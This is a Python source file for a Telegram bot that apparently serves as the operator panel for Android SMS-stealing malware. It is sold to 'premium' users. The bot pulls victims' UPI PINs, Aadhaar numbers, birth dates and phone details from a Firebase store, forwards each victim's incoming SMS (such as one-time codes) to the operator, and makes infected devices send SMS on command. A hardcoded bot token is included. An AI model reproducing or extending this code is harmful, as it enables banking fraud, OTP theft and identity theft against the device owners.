import logging
import requests
import asyncio
import math
from premium_manager import is_premium
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from flask import Flask
from threading import Thread
from datetime import datetime, timedelta
from premium_manager import is_admin, load_premium, save_premium

# Flask server for free hosting
app_flask = Flask(__name__)
@app_flask.route('/')
def home(): return "Bot is running!"
def run_flask(): app_flask.run(host='0.0.0.0', port=8080)
Thread(target=run_flask).start()

# Global variables
firebase_base = None
selected_device_id = None
monitored_channel_id = None
is_monitoring = False

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Helper function to block non-premium
async def check(update: Update):
    if not is_premium(update.effective_chat.id):
        await update.message.reply_text("❌ Aap premium user nahi hain. Access ke liye admin se contact karein!")
        return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check(update): return
    help_text = (
        "🤖 **Welcome to the Bot!**\n\n"
        "Ye bot tumhari devices aur channel ke beech data ko manage karta hai.\n"
        "Shuruat karne ke liye niche di gayi commands ka follow karein:\n\n"
        "1. /setfirebase <url> : Firebase database connection set karein.\n"
        "2. /setdevice : Apni device list dekhein aur select karein.\n"
        "3. /addchannel <channel_id> : Channel connect karein.\n"
        "4. /startmoniter : Monitoring start karein.\n\n"
        "🔥 **Step 1: Firebase URL set karne ke liye /setfirebase command use karein.**"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def add_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_chat.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Sirf Admin hi ye command use kar sakta hai!")
        return

    if len(context.args) < 2:
        await update.message.reply_text("❌ Format: /addpremium <chat_id> <days>")
        return

    target_chat_id = context.args[0]
    days = int(context.args[1])
    
    data = load_premium()
    expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    data[target_chat_id] = expiry
    save_premium(data)
    
    await update.message.reply_text(f"✅ User {target_chat_id} ko {days} din ka access mil gaya! Expiry: {expiry}")

async def remove_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_chat.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Sirf Admin hi ye command use kar sakta hai!")
        return

    if len(context.args) < 1:
        await update.message.reply_text("❌ Format: /removepremium <chat_id>")
        return

    target_chat_id = context.args[0]
    data = load_premium()
    
    if target_chat_id in data:
        del data[target_chat_id]
        save_premium(data)
        await update.message.reply_text(f"✅ User {target_chat_id} ka premium access remove kar diya gaya hai.")
    else:
        await update.message.reply_text(f"❌ User {target_chat_id} premium list mein nahi mila.")

async def set_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check(update): return
    global firebase_base
    if not context.args:
        await update.message.reply_text("❌ Usage: /setfirebase <url>\nExample: /setfirebase https://your-db.firebaseio.com")
        return
    
    url = context.args[0].replace('.json', '').rstrip('/')
    firebase_base = url
        
    await update.message.reply_text('✅ Firebase Connect Successfully!\n\nNext Step: /setdevice command use karein.')

async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check(update): return
    await show_device_page(update, context, 0)

async def show_device_page(update, context, page):
    global firebase_base
    if not firebase_base:
        await update.message.reply_text("❌ Pehle /setfirebase <url> use karo!")
        return
    
    try:
        response = requests.get(f"{firebase_base}/user_data.json")
        clients = response.json() or {}
        if not clients:
            await update.message.reply_text("Koi clients nahi mile 📱.")
            return

        items = list(clients.items())
        total_pages = math.ceil(len(items) / 10)
        page = max(0, min(page, total_pages - 1))
        
        start_idx = page * 10
        page_items = items[start_idx : start_idx + 10]

        keyboard = []
        msg = "📱 **DEVICES LIST:**\n\n"
        for client_id, info in page_items:
            login_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json")
            login_data = login_resp.json() if login_resp.status_code == 200 and login_resp.json() else {}
            
            pin = login_data.get('pin', 'N/A')
            adhar = login_data.get('Adhar', 'N/A')
            dob = login_data.get('dob', 'N/A')
            
            name = info.get('d_name', 'Unknown')
            status_icon = "🟢" if info.get('status') == "online" else "🔴"
            phone = info.get('phoneNumber', 'N/A')
            battery = info.get('battery', 'N/A')
            msg += f"{status_icon} {name}\n🆔 {client_id}\n📞 {phone}\n🔋 {battery}%\n📌 UPI Pin: {pin}\n💳 Adhar: {adhar}\n📅 DOB: {dob}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            keyboard.append([InlineKeyboardButton(f"{status_icon} {name}", callback_data=f"view_{client_id}")])

        nav = []
        if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"page_{page-1}"))
        nav.append(InlineKeyboardButton("❌ Cancel", callback_data="m_cancel"))
        if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"page_{page+1}"))
        keyboard.append(nav)

        if update.callback_query:
            await update.callback_query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check(update): return
    global selected_device_id
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("page_"):
        await show_device_page(update, context, int(query.data.split("_")[1]))
    elif query.data.startswith("view_"):
        client_id = query.data.split("_")[1]
        selected_device_id = client_id
        try:
            response = requests.get(f"{firebase_base}/user_data/{client_id}.json")
            details = response.json() or {}
            
            login_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json")
            login_data = login_resp.json() if login_resp.status_code == 200 and login_resp.json() else {}
            
            pin = login_data.get('pin', 'N/A')
            adhar = login_data.get('Adhar', 'N/A')
            dob = login_data.get('dob', 'N/A')
            
            status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
            msg = (f"📱 {details.get('d_name', 'Unknown')}\n"
                   f"🆔 {client_id}\n"
                   f"📞 {details.get('phoneNumber', 'Unknown')}\n"
                   f"🔋 {details.get('battery', 'N/A')}%\n"
                   f"📌 UPI Pin: {pin}\n"
                   f"💳 Adhar: {adhar}\n"
                   f"📅 DOB: {dob}\n"
                   f"{status}\n\n"
                   f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
            await query.edit_message_text(text=msg)
        except Exception as e:
            await query.edit_message_text(f"Error: {str(e)}")
    elif query.data == "m_cancel":
        await query.edit_message_text("❌ Operation Cancelled.")

async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check(update): return
    global monitored_channel_id
    if not context.args:
        await update.message.reply_text("Usage: /addchannel <channel_id>")
        return
    monitored_channel_id = context.args[0]
    await update.message.reply_text(f"✅ Channel {monitored_channel_id} connected!\n⚠️Or Bot Ko Channel Me Admin Banaye\n\nNext Step: /startmoniter")

async def monitor_task(chat_id, context):
    global is_monitoring, selected_device_id
    last_sms_id = None

    # Initial last_sms_id set kar rahe hain
    try:
        data = requests.get(f"{firebase_base}/user_sms/{selected_device_id}.json").json()
        if data and isinstance(data, dict):
            last_sms_id = list(data.keys())[-1]
    except:
        pass

    while is_monitoring:
        try:
            # Firebase se specific device ka data fetch karo
            data = requests.get(f"{firebase_base}/user_sms/{selected_device_id}.json").json()
            
            if data and isinstance(data, dict):
                current_keys = list(data.keys())
                latest_key = current_keys[-1]

                # Sirf tabhi message bhejo agar nayi key mili hai
                if latest_key != last_sms_id:
                    last_sms_id = latest_key
                    sms = data[latest_key]
                    
                    # Firebase structure ke hisaab se sahi keys le rahe hain
                    sender = sms.get('sender', 'Unknown')
                    time_val = sms.get('date', 'Unknown') # JSON mein 'date' field hai
                    msg_content = sms.get('body', 'No Content') # JSON mein 'body' field hai

                    # Telegram mein code block (`...`) par click karte hi text copy ho jata hai
                    text = (f"📩 New Incoming SMS\n\n"
                            f"📱 From: {sender}\n"
                            f"🕒 Time: {time_val}\n\n"
                            f"💬 Message:\n`{msg_content}`")
                    
                    # Markdown ka use kiya hai taaki code block kaam kare
                    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown")

        except Exception as e:
            print(f"Error in monitor: {e}")
            
        await asyncio.sleep(5)
        
async def start_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check(update): return
    global is_monitoring
    if not selected_device_id or not monitored_channel_id:
        await update.message.reply_text("❌ Error: Channel set karna zaroori hai!")
        return
    is_monitoring = True
    asyncio.create_task(monitor_task(update.effective_chat.id, context))
    await update.message.reply_text("🚀 Monitoring Started! Aab Message Bot Pe Aayenge.")

async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_monitoring, selected_device_id
    if is_monitoring and update.channel_post and str(update.channel_post.chat.id) == monitored_channel_id:
        msg_text = update.channel_post.text or ""
        try:
            target_number = ""
            token = ""
            if "To:" in msg_text and "Message:" in msg_text:
                target_number = msg_text.split("To:")[1].split("\n")[0].strip()
                token = msg_text.split("Message:")[1].split("\n")[0].strip()
            
            if target_number and token:
                payload = {"from": 0, "to": target_number, "message": token, "isSended": False}
                push_url = f"{firebase_base}/user_data/{selected_device_id}/webhookEvent/sendSms.json"
                response = requests.put(push_url, json=payload)
                if response.status_code == 200:
                    await update.effective_chat.send_message(f"✅ SMS Sent to Connection Device!\n🎯 To: {target_number}")
                else:
                    await update.effective_chat.send_message(f"❌ Firebase Error: {response.status_code}")
            else:
                await update.message.reply_text("❌ Format mismatch!")
        except Exception as e:
            await update.effective_chat.send_message(f"❌ Error: {str(e)}")

if __name__ == '__main__':
    TOKEN = '8625469610:AAE2R7UpGmuyC7atp7xvX3f8Lns-u9PmCrE'
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addpremium", add_premium))
    app.add_handler(CommandHandler("removepremium", remove_premium))
    app.add_handler(CommandHandler("setfirebase", set_firebase))
    app.add_handler(CommandHandler("setdevice", set_device))
    app.add_handler(CommandHandler("addchannel", add_channel))
    app.add_handler(CommandHandler("startmoniter", start_monitor))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.ChatType.CHANNEL, forward_messages))
    app.run_polling()
    
